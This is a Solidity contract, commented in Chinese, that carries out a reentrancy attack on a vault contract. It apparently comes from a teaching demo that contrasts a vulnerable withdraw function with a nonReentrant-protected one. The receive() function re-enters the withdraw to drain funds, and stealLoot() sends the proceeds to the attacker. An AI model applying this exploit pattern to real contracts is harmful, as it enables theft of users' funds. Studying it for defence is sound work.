// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// 声明接口以便与金库交互
interface IVault {
    function deposit() external payable;
    function vulnerableWithdraw() external;
    function safeWithdraw() external;
}

contract GoldThief {
    IVault public targetVault;  // 目标金库
    address public owner;       // 发起攻击者的地址
    uint public attackCount;    // 攻击次数
    bool public attackingSafe;  // 是否是攻击安全提款函数的标识

    constructor(address _vaultAddress) {
        targetVault = IVault(_vaultAddress);  // 要攻击的目标金库的合约地址
        owner = msg.sender;                   // 发起攻击者的地址
    }

    // 对易受攻击的提款函数进行攻击
    function attackVulnerable() external payable {
        require(msg.sender == owner, "Only owner");  // 只有部署本攻击合约的人才能发起攻击
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");

        attackingSafe = false;
        attackCount = 0;

        targetVault.deposit{value: msg.value}();
        // 调用易受攻击的提款函数进行提款，当收到ETH时会触发本合约的receive函数（没有receive则会触发fallback函数）
        // 按照receive的逻辑, 会一直提款直到达到攻击次数的上限
        targetVault.vulnerableWithdraw();
    }

    // 对安全的提款函数发起攻击
    function attackSafe() external payable {
        require(msg.sender == owner, "Only owner");
        require(msg.value >= 1 ether, "Need at least 1 ETH");

        attackingSafe = true;
        attackCount = 0;

        targetVault.deposit{value: msg.value}();
        targetVault.safeWithdraw();
    }

    receive() external payable {
        attackCount++;
        // 对于易受攻击的提款函数, 当金库余额大于1ETH且未达到攻击次数上限时会持续提款
        if (!attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5) {
            targetVault.vulnerableWithdraw();
        }

        if (attackingSafe) {
            targetVault.safeWithdraw(); // This will fail due to nonReentrant
        }
    }

    // 将攻击所得全部转账到发起攻击者的钱包
    function stealLoot() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }

    // 查询本合约的余额也即攻击所得的ETH
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}